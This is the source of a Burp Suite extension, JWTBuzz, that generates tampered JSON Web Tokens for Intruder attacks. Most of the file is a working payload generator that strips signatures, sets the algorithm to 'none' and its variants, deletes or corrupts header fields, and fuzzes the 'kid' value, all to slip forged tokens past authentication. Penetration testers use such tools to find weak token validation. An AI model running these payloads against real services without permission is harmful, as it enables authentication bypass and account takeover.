# JWTBuzz - A fuzzer for JSON Web Tokens in Burp Suite
#
# How to use:
# - Load the extension in Burp Suite (make sure the Jython runtime works first).
# - In Intruder, mark your entire JWT in the request
# - In the Payloads tab, select the Payload type = Extension-generated
#   and select JWTBuzz payload generator
#
# Not using the PyJWT project since it is not compatible with Jython (although
# it's possible with many modifications). Also, having control on exactly which
# fields are transformed and hacked is important here.
#
# Author: Alexandre Hamelin <alexandre.hamelin gmail.com>

import string
import base64
import json
from array import array
from burp import IBurpExtender, IExtensionStateListener
from burp import IIntruderPayloadGenerator, IIntruderPayloadGeneratorFactory


class BurpExtender(IBurpExtender, IExtensionStateListener, IIntruderPayloadGenerator, IIntruderPayloadGeneratorFactory):
    def registerExtenderCallbacks(self, callbacks):
        self.debug = False  # logging

        callbacks.setExtensionName("JWTBuzz");
        self._callbacks = callbacks
        self._stdout = callbacks.getStdout()
        self._stderr = callbacks.getStderr()
        self._helpers = callbacks.getHelpers()
        self.printOutput = callbacks.printOutput
        self.printError = callbacks.printError
        self.log = self._callbacks.printOutput if self.debug else lambda x: None

        callbacks.registerExtensionStateListener(self);
        callbacks.registerIntruderPayloadGeneratorFactory(self)

        return


    # IExtensionStateListener

    def extensionUnloaded(self):
        self.log('extension unloaded')


    # IIntruderPayloadGenerator
    #boolean hasMorePayloads();
    #byte[] getNextPayload(byte[] baseValue);
    #void reset();

    def hasMorePayloads(self):
        self.log('hasMorePayloads')
        try:
            self.next_val = next(self.generator)
        except StopIteration:
            self.log(' returning false')
            return False
        except AttributeError:
            self.log(' returning true, first run')
            return True
        self.log(' returning true')
        return True
    
    def getNextPayload(self, baseValue):
        self.log('getNextPayload: baseValue={baseValue}'.format(**locals()))
        if not hasattr(self, 'base_jwt'):
            # first iteration, initialize with base value and yield first val
            self.base_jwt = baseValue.tostring()
            self.generator = create_jwt_generator(self.base_jwt)
            self.next_val = next(self.generator)
        self.log(' returning val={self.next_val}'.format(**locals()))
        return self._helpers.stringToBytes(self.next_val)
    
    def reset(self):
        self.log('reset')
        del self.base_jwt
        del self.generator

    # IIntruderPayloadGeneratorFactory
    #String getGeneratorName();
    #IIntruderPayloadGenerator createNewInstance(IIntruderAttack attack);
    
    def getGeneratorName(self):
        return 'JWTBuzz'
        
    def createNewInstance(self, attack):
        self.log('createNewInstance: id={id}'.format(id=hex(id(self))))
        self._attack = attack  # unused
        return self


# JWT helper functions
# TODO: Implement crypto and signature verification and attacks

def ub64d(enc):
    padding = len(enc) % 4
    if padding > 0:
        enc += '=' * (4 - padding)
    return base64.urlsafe_b64decode(enc)

def ub64e(dec):
    return base64.urlsafe_b64encode(dec).strip('=')

def valid_jwt(jwt, verify_sig=False, verify_claims=False):
    try:
        parts = jwt.split('.')
        hdr = ub64d(parts[0])
        payload = ub64d(parts[1])
        sig = parts[2]
        
        json.loads(hdr)
        json.loads(payload)
        return True
    except (IndexError, TypeError, ValueError):
        return False

def create_jwt_generator(jwt):
    if not valid_jwt(jwt):
        yield jwt
        return

    hdr, payload, sig = jwt.split('.')

    yield hdr + '.' + payload + '.'
    yield jwt + '.'
    yield 'e30.' + payload + '.' + sig  # 'e30' is encoded '{}'
    yield hdr + '.e30.' + sig
    yield hdr + '..'

    fuzz_chars = string.punctuation
    fake_hdr = json.loads(ub64d(hdr))

    def mkjwt():
        return ub64e(json.dumps(fake_hdr)) + '.' + payload + '.' + sig

    fake_hdr['typ'] = fake_hdr['typ'].swapcase(); yield mkjwt()
    fake_hdr['typ'] = 'xxx'; yield mkjwt()
    fake_hdr['typ'] = []; yield mkjwt()
    fake_hdr['typ'] = []; yield mkjwt()
    fake_hdr['typ'] = False; yield mkjwt()
    fake_hdr['typ'] = 'JWT'

    for alg in ('none', 'None', 'NONE', 'NUL', 'NULL', 'Null', 'null', ''):
        fake_hdr['alg'] = alg; yield mkjwt()

    fake_hdr['alg'] = None; yield mkjwt()
    del fake_hdr['alg']; yield mkjwt()
    del fake_hdr['typ']; yield mkjwt()

    fake_hdr = json.loads(ub64d(hdr)) # reinit
    dec_hdr = json.loads(ub64d(hdr))
    if 'kid' in dec_hdr:
        for c in fuzz_chars:
            fake_hdr['kid'] = dec_hdr['kid'] + c; yield mkjwt()
